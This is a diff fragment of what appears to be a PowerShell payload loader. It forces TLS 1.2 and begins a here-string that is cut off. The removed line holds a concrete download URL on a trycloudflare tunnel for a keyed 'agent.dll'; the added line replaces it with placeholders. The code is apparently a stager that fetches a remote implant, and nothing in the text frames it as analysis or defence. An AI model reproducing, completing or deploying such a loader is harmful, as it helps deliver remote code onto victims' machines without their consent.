@@ -1,4 +1,4 @@
-$u="https://geometry-offered-guns-replies.trycloudflare.com/static/download/agent.dll?key=8ca60eebbe9a141869305ed9ab1a0050"
+$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/static/download/agent.dll?key=PLACEHOLDER_TOKEN"
 [Net.ServicePointManager]::SecurityProtocol="Tls12"
 
 $c=@"
